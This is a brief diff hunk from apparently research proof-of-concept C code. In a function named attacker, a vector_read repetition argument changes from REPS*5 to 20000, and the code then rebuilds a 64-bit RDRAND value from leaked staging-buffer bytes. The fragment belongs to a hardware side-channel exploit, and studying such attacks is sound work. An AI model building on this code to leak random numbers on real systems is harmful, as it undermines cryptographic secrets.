@@ -43,7 +43,7 @@ void attacker(int reps){
         :::"eax");
         while (!rdrand_section_changed(mem, byte_32)){}
         uint64_t random_number = 0;
-        vector_read(mem, REPS*5, staging_buffer, 32, 40, 0);
+        vector_read(mem, 20000, staging_buffer, 32, 40, 0);
         for(int i = 0; i < 8; i++) {
             random_number = random_number << 8;
             random_number += staging_buffer[32 + (8 - i - 1)];
